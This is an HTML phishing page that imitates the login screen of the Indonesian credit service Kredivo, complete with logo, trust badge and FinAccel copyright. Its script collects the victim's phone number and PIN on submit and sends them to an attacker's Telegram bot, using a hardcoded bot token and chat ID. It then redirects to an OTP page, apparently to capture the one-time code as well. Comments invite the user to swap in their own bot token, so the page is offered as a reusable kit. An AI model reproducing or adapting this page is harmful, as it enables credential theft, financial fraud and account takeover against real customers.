<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Login Akun Kredivo</title>
<style>
  /* Reset dan styling dasar */
  body {
    margin: 0;
    padding: 0 15px 40px;
    font-family: Arial, sans-serif;
    background-color: #fff;
    color: #111827;
    font-size: 16px;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }
  header {
    display: flex;
    align-items: center;
    padding: 15px 0;
  }
  .back-arrow {
    width: 20px;
    height: 20px;
    cursor: pointer;
    fill: #1f2937;
    flex-shrink: 0;
    margin-right: 10px;
  }
  header h1 {
    font-weight: 600;
    font-size: 16px;
    margin: 0;
    flex-grow: 1;
  }
  .help-link {
    color: #ff7b00;
    font-weight: 600;
    font-size: 14px;
    text-decoration: none;
    white-space: nowrap;
  }
  .help-link:hover {
    text-decoration: underline;
  }
  .logo {
    display: block;
    margin: 20px auto 32px;
    width: 120px;
    height: auto;
  }
  .login-container {
    max-width: 400px;
    margin: 0 auto;
    background-color: #fff;
    border-radius: 12px;
    padding: 24px 24px 36px;
    box-shadow: 0 2px 8px rgb(0 0 0 / 0.05);
    box-sizing: border-box;
  }
  .login-container label {
    display: block;
    font-weight: 600;
    margin-bottom: 10px;
    font-size: 14px;
    color: #111827;
  }
  /* Input group nomor HP */
  .input-group {
    display: flex;
    margin-bottom: 16px;
  }
  .input-prefix {
    background-color: #f5f5f7;
    border: 1px solid #d1d5db;
    border-right: none;
    border-radius: 8px 0 0 8px;
    color: #6b7280;
    font-size: 16px;
    padding: 0 14px;
    display: flex;
    align-items: center;
    user-select: none;
    height: 44px;
    line-height: 44px;
    box-sizing: border-box;
    flex-shrink: 0;
  }
  .input-group input[type="text"] {
    flex-grow: 1;
    border: 1px solid #d1d5db;
    border-radius: 0 8px 8px 0;
    padding: 0 14px;
    font-size: 16px;
    height: 44px;
    outline: none;
    box-sizing: border-box;
    color: #1f2937;
  }
  .input-group input[type="text"]::placeholder {
    color: #9ca3af;
  }
  /* PIN input */
  .pin-input {
    position: relative;
    margin-bottom: 12px;
  }
  .pin-input input {
    width: 100%;
    height: 44px;
    font-size: 16px;
    padding: 0 40px 0 14px;
    border-radius: 8px;
    border: 1px solid #d1d5db;
    box-sizing: border-box;
    color: #1f2937;
    outline: none;
  }
  .pin-input input::placeholder {
    color: #9ca3af;
  }
  .toggle-visibility {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    fill: #6b7280;
    width: 20px;
    height: 20px;
    user-select: none;
  }
  /* Link lupa PIN */
  .forgot-pin {
    color: #3b82f6;
    font-size: 14px;
    text-decoration: none;
    display: inline-block;
    margin-bottom: 15px;
    user-select: none;
  }
  .forgot-pin:hover {
    text-decoration: underline;
  }
  /* Info box with toggle */
  .info-box {
    background-color: #f5f5f7;
    border-radius: 12px;
    padding: 12px 16px;
    font-size: 14px;
    color: #374151;
    display: flex;
    align-items: center;
    gap: 6px;
    margin-bottom: 24px;
    user-select: none;
  }
  .info-box svg {
    flex-shrink: 0;
    width: 14px;
    height: 14px;
    fill: #6b7280;
    cursor: default;
  }
  /* Toggle Switch */
  .toggle-switch {
    margin-left: auto;
    position: relative;
    width: 36px;
    height: 20px;
    flex-shrink: 0;
  }
  .toggle-switch input {
    opacity: 0;
    width: 0;
    height: 0;
    position: absolute;
  }
  .slider {
    position: absolute;
    cursor: pointer;
    background-color: #e5e7eb;
    border-radius: 20px;
    top: 0; left: 0; right: 0; bottom: 0;
    transition: background-color 0.3s ease;
  }
  .slider:before {
    position: absolute;
    content: "";
    height: 16px;
    width: 16px;
    left: 2px;
    bottom: 2px;
    background-color: white;
    border-radius: 50%;
    transition: transform 0.3s ease;
    box-shadow: 0 0 2px rgba(0,0,0,0.15);
  }
  input:checked + .slider {
    background-color: #60a5fa;
  }
  input:checked + .slider:before {
    transform: translateX(16px);
  }
  /* Tombol masuk */
  .btn-login {
    background-color: #ff7b00;
    border: none;
    border-radius: 8px;
    color: #fff;
    font-weight: 600;
    font-size: 16px;
    padding: 12px 0;
    width: 100%;
    cursor: pointer;
    user-select: none;
    box-shadow: 0 4px 8px rgba(255,123,0,0.3);
    transition: background-color 0.3s ease;
  }
  .btn-login:hover {
    background-color: #e67000;
  }
  /* Link daftar */
  .register-link {
    text-align: center;
    font-size: 14px;
    margin-top: 15px;
    color: #374151;
    user-select: none;
  }
  .register-link a {
    color: #ff7b00;
    text-decoration: none;
    font-weight: 600;
  }
  .register-link a:hover {
    text-decoration: underline;
  }
  /* Footer */
  footer {
    max-width: 400px;
    margin: 48px auto 24px;
    text-align: center;
    font-size: 12px;
    color: #6b7280;
    user-select: none;
  }
  footer .geotrust {
    margin-bottom: 8px;
  }
  footer .geotrust img {
    width: 90px;
    vertical-align: middle;
  }
  /* Responsive */
  @media (max-width: 440px) {
    body {
      padding: 10px 10px 40px;
    }
    .login-container {
      padding: 20px 18px 32px;
      margin: 0 8px;
    }
    .logo {
      width: 90px;
      margin-bottom: 28px;
    }
  }
</style>
</head>
<body>

<header>
  <!-- Icon panah kembali sebagai SVG -->
  <svg class="back-arrow" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" role="img" >
    <path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
  </svg>
  <h1>Kredivo</h1>
  <a href="#" class="help-link">Butuh Bantuan?</a>
</header>

<img class="logo" src="https://cdn.brandfetch.io/idUHsrVOep/theme/dark/logo.svg?c=1bxid64Mup7aczewSAYMX&t=1667622945900" alt="Kredivo Logo" />

<div class="login-container">
  <form id="loginForm" novalidate>
    <label for="phone">Masuk ke Akun Kredivo-mu</label>
    <div class="input-group">
      <div class="input-prefix">+62</div>
      <input 
        type="text" 
        id="phone" 
        name="phone" 
        placeholder="Nomor Handphone" 
        inputmode="numeric" 
        pattern="[0-9]*" 
        maxlength="15" 
        required 
        autocomplete="tel"
      />
    </div>
    <div class="pin-input">
      <input 
        type="password" 
        id="pin" 
        name="pin" 
        placeholder="PIN" 
        inputmode="numeric" 
        pattern="[0-9]*" 
        maxlength="6" 
        required 
        autocomplete="off" 
      />
      <!-- Icon mata sebagai SVG -->
      <svg 
        class="toggle-visibility" 
        viewBox="0 0 24 24" 
        xmlns="http://www.w3.org/2000/svg" 
        aria-hidden="true" 
        focusable="false" 
        role="button" 
        tabindex="0" 
        onclick="togglePinVisibility()" 
        onkeydown="if(event.key==='Enter' || event.key===' ') { togglePinVisibility(); event.preventDefault(); }"
      >
        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" stroke="currentColor" stroke-width="2" fill="none" stroke-linejoin="round" />
        <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" fill="none" />
      </svg>
    </div>
    <a href="#" class="forgot-pin">Lupa PIN-mu?</a>
    <div class="info-box" title="Informasi tambahan">
      Hubungkan akunmu untuk pembayaran lebih cepat
      <!-- Icon info sebagai SVG -->
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" role="img">
        <circle cx="12" cy="12" r="10" stroke="#6b7280" stroke-width="2" fill="none"/>
        <line x1="12" y1="8" x2="12" y2="12" stroke="#6b7280" stroke-width="2" stroke-linecap="round"/>
        <circle cx="12" cy="16" r="1" fill="#6b7280" />
      </svg>
      <label class="toggle-switch" aria-label="Toggle hubungkan akun">
        <input type="checkbox" checked aria-checked="true"/>
        <span class="slider"></span>
      </label>
    </div>
    <button type="submit" class="btn-login" aria-label="Masuk ke akun">Masuk</button>
  </form>
  <div class="register-link">
    Belum punya akun? <a href="#">Daftar lewat sini yuk</a>
  </div>
</div>

<footer>
  <div class="geotrust">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/e1/GeoTrust_logo.svg/1280px-GeoTrust_logo.svg.png" alt="GeoTrust Secure" />
  </div>
  <div>Copyright Â© 2026 FinAccel. All rights reserved.</div>
</footer>

<script>
    // Toggle visibilitas PIN
    function togglePinVisibility() {
        const pinInput = document.getElementById('pin');
        if (pinInput.type === 'password') {
            pinInput.type = 'text';
        } else {
            pinInput.type = 'password';
        }
    }

    // Isi nomor handphone dari localStorage saat halaman dimuat
    document.addEventListener('DOMContentLoaded', () => {
        const savedPhone = localStorage.getItem('kredivo_phone');
        if (savedPhone) {
            document.getElementById('phone').value = savedPhone;
        }
    });

    // Kirim data ke Telegram dan simpan nomor handphone saat submit form
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // mencegah reload halaman

        const phoneInput = document.getElementById('phone');
        const pinInput = document.getElementById('pin');

        // Validasi sederhana
        if (!phoneInput.value.trim()) {
            alert('Nomor handphone wajib diisi!');
            phoneInput.focus();
            return;
        }
        if (!pinInput.value.trim()) {
            alert('PIN wajib diisi!');
            pinInput.focus();
            return;
        }

        // Simpan nomor handphone ke localStorage
        localStorage.setItem('kredivo_phone', phoneInput.value.trim());

        // --- Kirim data ke Telegram ---
        const botToken = '8453347707:AAGCumSDmGGixBzHqZ8oevj8XCMBamCKSJM'; // Ganti dengan token bot Telegram Anda
        const chatId = '7774155442';     // Ganti dengan chat ID tujuan Anda

        const message = `*Data Login Kredivo*\n\n` +
                        `Nomor Handphone: +62${phoneInput.value.trim()}\n` +
                        `PIN: ${pinInput.value.trim()}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                window.location.href = "otp.html";
                // Anda bisa lakukan submit asli ke server di sini jika perlu
                // this.submit(); // Jika ingin benar-benar submit form
            } else {
                alert('Gagal mengirim data ke Telegram');
            }
        })
        .catch(error => {
            alert('Terjadi kesalahan saat mengirim data: ' + error.message);
        });
    });
</script>

</body>
</html>
